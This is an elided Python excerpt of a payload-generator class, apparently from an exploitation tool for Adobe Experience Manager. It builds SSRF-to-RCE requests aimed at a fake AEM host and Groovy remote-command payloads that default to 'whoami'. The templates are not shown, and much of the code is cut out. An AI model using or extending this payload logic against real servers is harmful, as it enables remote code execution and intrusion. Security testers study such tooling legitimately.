...
class PayloadGeneratorMixin:
    ...
    def generate_ssrf_rce_payload(self, fake_aem_host: str) -> str:
        ...
        json_data = template["json_data_template"].format(
            uuid=uuid_val, fakeaem=fakeaem_encoded
        )
        length = len(json_data)

        params = template["params_template"].format(
            uuid=uuid_val, length=length, json_data=json_data
        )
    ...
    def generate_groovy_rce_payload(self, command: str = "whoami") -> str:
        ...
        if command == "whoami":
            ...
            return self._payload_templates["groovy_rce"]["custom"].format(
                cmd=quote(command)
            )
